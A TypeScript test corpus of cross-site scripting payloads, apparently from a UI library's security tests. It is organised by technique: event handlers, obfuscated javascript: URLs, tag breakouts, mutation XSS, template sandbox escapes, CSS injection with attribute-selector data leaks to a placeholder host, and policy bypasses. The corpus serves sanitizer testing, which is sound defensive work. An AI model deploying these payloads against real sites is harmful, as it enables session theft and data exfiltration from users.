/**
 * The script-injection corpus (T-441, contracts/attacks.md "Injection",
 * research R7): this repository's own payloads, by technique. Each is a
 * function of a case id: script that runs calls `__relaxPwned(id)`, and a
 * request it makes goes to `https://pwn.relax-ui.invalid/<id>`, so the
 * evidence names the payload and the prop it was placed in.
 */

export type Technique =
  | "event-handler"
  | "script-url"
  | "breakout"
  | "namespace"
  | "mxss"
  | "template-expression"
  | "css"
  | "policy-bypass"
  | "spoofing";

export interface Payload {
  id: string;
  technique: Technique;
  make(id: string): string;
}

/** Where a payload's request goes: a reserved name that never resolves (RFC 2606). */
export const PWN_HOST = "pwn.relax-ui.invalid";
export const pwnUrl = (id: string) => `https://${PWN_HOST}/${id}`;
const call = (id: string) => `__relaxPwned('${id}')`;
const img = (id: string) => `<img src=x onerror=${call(id)}>`;

const handlers: [string, (id: string) => string][] = [
  ["img", img],
  ["svg", (id) => `<svg onload=${call(id)}>`],
  ["svg-animate", (id) => `<svg><animate onbegin=${call(id)} attributeName=x dur=1s>`],
  ["details", (id) => `<details open ontoggle=${call(id)}>`],
  ["iframe", (id) => `<iframe onload=${call(id)}></iframe>`],
  ["video", (id) => `<video><source onerror=${call(id)}></video>`],
  ["audio", (id) => `<audio src=x onerror=${call(id)}>`],
  ["input", (id) => `<input autofocus onfocus=${call(id)}>`],
  ["body", (id) => `<body onload=${call(id)}>`],
  ["object", (id) => `<object data=x onerror=${call(id)}></object>`],
  ["style", (id) => `<style onload=${call(id)}></style>`],
  ["marquee", (id) => `<marquee onstart=${call(id)}>x</marquee>`],
  ["select", (id) => `<select autofocus onfocus=${call(id)}></select>`],
  ["math", (id) => `<math><maction actiontype=statusline onmouseover=${call(id)}>x</maction></math>`],
  ["quoted", (id) => `<img src="x" onerror="${call(id)}">`],
  ["slash", (id) => `<img/src=x/onerror=${call(id)}>`],
];

const urls: [string, (id: string) => string][] = [
  ["plain", (id) => `javascript:${call(id)}`],
  ["mixed-case", (id) => `JaVaScRiPt:${call(id)}`],
  ["tab", (id) => `java\tscript:${call(id)}`],
  ["newline", (id) => `java\nscript:${call(id)}`],
  ["entity", (id) => `&#106;avascript:${call(id)}`],
  ["hex-entity", (id) => `&#x6A;avascript:${call(id)}`],
  ["colon-entity", (id) => `javascript&colon;${call(id)}`],
  ["percent", (id) => `%6Aavascript:${call(id)}`],
  ["null-byte", (id) => `\u0000javascript:${call(id)}`],
  ["control", (id) => `\u0001javascript:${call(id)}`],
  ["leading-space", (id) => `  javascript:${call(id)}`],
  ["comment", (id) => `javascript://%0a${call(id)}`],
  ["data-html", (id) => `data:text/html,<script>parent.${call(id)}</script>`],
  ["data-base64", (id) => `data:text/html;base64,${btoa(`<script>parent.${call(id)}</script>`)}`],
  ["vbscript", () => `vbscript:msgbox(1)`],
  ["in-anchor", (id) => `<a href="javascript:${call(id)}">x</a>`],
  ["external", (id) => pwnUrl(id)],
  ["protocol-relative", (id) => `//${PWN_HOST}/${id}`],
];

const breakouts: [string, (id: string) => string][] = [
  ["title", (id) => `</title>${img(id)}`],
  ["textarea", (id) => `</textarea>${img(id)}`],
  ["style", (id) => `</style>${img(id)}`],
  ["script", (id) => `</script><script>${call(id)}</script>`],
  ["comment", (id) => `-->${img(id)}`],
  ["cdata", (id) => `]]>${img(id)}`],
  ["double-quote", (id) => `"><img src=x onerror=${call(id)}>`],
  ["single-quote", (id) => `'><img src=x onerror=${call(id)}>`],
  ["attribute", (id) => `" onmouseover="${call(id)}" x="`],
];

const namespaces: [string, (id: string) => string][] = [
  ["svg-style", (id) => `<svg><style>${img(id)}</style></svg>`],
  ["math-style", (id) => `<math><mtext><table><mglyph><style>${img(id)}`],
  ["foreign-object", (id) => `<svg><foreignObject>${img(id)}</foreignObject></svg>`],
  ["svg-link", (id) => `<svg><a xlink:href="javascript:${call(id)}"><text y=20>x</text></a></svg>`],
  ["svg-script", (id) => `<svg><script>${call(id)}</script></svg>`],
];

const mxss: [string, (id: string) => string][] = [
  ["noscript", (id) => `<noscript><p title="</noscript>${img(id)}">`],
  ["template", (id) => `<template>${img(id)}</template>`],
  ["nested-form", (id) => `<form><math><mtext></form><form><mglyph><style></math>${img(id)}`],
  ["attribute-quote", (id) => `<a title="&quot;>${img(id).replace(/</g, "&lt;")}">x</a>`],
  ["table", (id) => `<table><td>${img(id)}</td></table>`],
];

const templates: [string, (id: string) => string][] = [
  ["mustache-constructor", (id) => `{{constructor.constructor("${call(id)}")()}}`],
  ["angular-sandbox", (id) => `{{$on.constructor("${call(id)}")()}}`],
  ["vue-render", (id) => `{{_c.constructor("${call(id)}")()}}`],
  ["template-literal", (id) => `\${${call(id)}}`],
  ["v-html", (id) => `<div v-html="'${img(id).replace(/'/g, "\\'")}'"></div>`],
  ["ng-bind-html", (id) => `<div [innerHTML]="'${img(id)}'"></div>`],
];

const css: [string, (id: string) => string][] = [
  ["url-javascript", (id) => `url(javascript:${call(id)})`],
  ["url-external", (id) => `url(${pwnUrl(id)})`],
  ["expression", (id) => `expression(${call(id)})`],
  ["import", (id) => `@import '${pwnUrl(id)}';`],
  ["declaration", (id) => `red;background:url(${pwnUrl(id)})`],
  ["rule", (id) => `}*{background:url(${pwnUrl(id)})}`],
  ["style-element", (id) => `<style>@import '${pwnUrl(id)}';</style>`],
  ["selector", (id) => `input[value^="a"]{background:url(${pwnUrl(id)})}`],
];

const policy: [string, (id: string) => string][] = [
  ["base", (id) => `<base href="${pwnUrl(id)}/">`],
  ["meta-refresh", (id) => `<meta http-equiv="refresh" content="0;url=${pwnUrl(id)}">`],
  ["form-action", (id) => `<form action="${pwnUrl(id)}"><button>go</button></form>`],
  ["import-map", (id) => `<script type="importmap">{"imports":{"x":"${pwnUrl(id)}"}}</script>`],
  ["stylesheet", (id) => `<link rel="stylesheet" href="${pwnUrl(id)}">`],
  ["srcdoc", (id) => `<iframe srcdoc="<script>parent.${call(id)}</script>"></iframe>`],
  ["image", (id) => `<img src="${pwnUrl(id)}">`],
];

const spoofing: [string, (id: string) => string][] = [
  ["rtl-override", (id) => `\u202Egnp.${id}//:sptth`],
  ["zero-width", (id) => `https://bank\u200D.example/${id}`],
  ["isolate", (id) => `Pay \u2066${id}\u2069 here`],
];

const group = (technique: Technique, list: [string, (id: string) => string][]): Payload[] =>
  list.map(([name, make]) => ({ id: `${technique}.${name}`, technique, make }));

export const CORPUS: readonly Payload[] = [
  ...group("event-handler", handlers),
  ...group("script-url", urls),
  ...group("breakout", breakouts),
  ...group("namespace", namespaces),
  ...group("mxss", mxss),
  ...group("template-expression", templates),
  ...group("css", css),
  ...group("policy-bypass", policy),
  ...group("spoofing", spoofing),
];
